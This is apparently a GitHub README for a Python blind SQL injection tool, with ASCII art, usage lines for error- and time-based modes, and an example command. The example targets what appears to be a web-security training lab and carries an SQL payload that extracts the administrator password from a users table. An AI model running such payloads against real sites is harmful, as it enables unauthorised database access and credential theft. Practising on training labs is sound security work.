```
Y#~!^                                      .~.    
7@@JG~            ..   :^~?Y?7.            .!5    
 !@&~G!            : ~&@@@@@@P            ..:5.   
  !@&~P~           ^:#@@@@@@&5~.           ::!^   
   ~@#:Y!           :G@@@@@&G5?~~^          ::7   
    !@B^G~          .P@@BY!    :~:          . ::  
    B@@P:57:^:       !P!  ::.?B#^          ~:.7.  
 !G&@&&&P?7..~~      7~~#Y#@@@&!        :!:^&@@:  
.@@@&P&#B5Y!:.J7     .J!@&#GB@B.        ^G? J@@#. 
 Y@@&#@#PJ7!7~~#:     5PG7~  :5P7            ~BG. 
  5@@@&^   7YB::Y     .?  .~  .JG:                
   :YP#~  .55?. G.     G:  ~J?^~Y^                
      .JY      .#^     JP   .^Y5^                 
        !5^     :^     .B:    !!:            .:~7Y
       .P@#J.!^         ^~  .7PB~          !GBPP5Y
       ^@@&J!P#~         :.~?~5:       :^~B&BJJ?P&
        !@B5YP#&7.       ^J:.        .7~Y##G?Y5&@@
        ~@@@@@@@&J^:  .!~~.         ~5?Y##YJP#&P&@
        5@@@&5GYP&PJ7.^:      ~    G7?G#G75&&P^?&&
        P@@GYPB#&&J^PP.       ~   :5 ?GP~J@#~ :G&&
        ?@@P?YYJPP  ~&&PGBBGBPJ: ^5J!:Y^!#Y  !#B5:
        .@@7~GJYJ^ ~#@@@@@@@@@@@&&#BB!!^!:  JBJ. ^
         B@&&Y77~:J@@@  ZATOICHI  @@&?JY.  .77Y7YP
```        

# Auto BLIND SQL INJECTION TOOL By Xifeng2009

## Usage
Specify ^PAYLOAD^ in url/cookie/header , this script will replace it with payload
Require: your own payload, the script will format payload with guessed password where {}{} is found

Blind SQL Injection Based on Error
python3 blindSQLman.py -u [URL] [-c [COOKIE]] -D [DIFF] 
Blind SQL Injection Based on Time
python3 blindSQLman.py -u [URL] [-c [COOKIE]] --tech T -D [DIFF] [--timeout 5]

## EXAMPLE:
    python3 blindSQLman.py -u https://ac7d1fba1e422a3ac0ad8e3800f20085.web-security-academy.net/filter?category=Gifts -c "TrackingId=Clv6J8Q4AjAffZhD^PAYLOAD^; session=dGVP3Aje0wspCVHJzYpBV0YluhL4o623" -p "' and (select password from users where username='administrator') like '{0}{1}%25'---" -D "Welcome back!"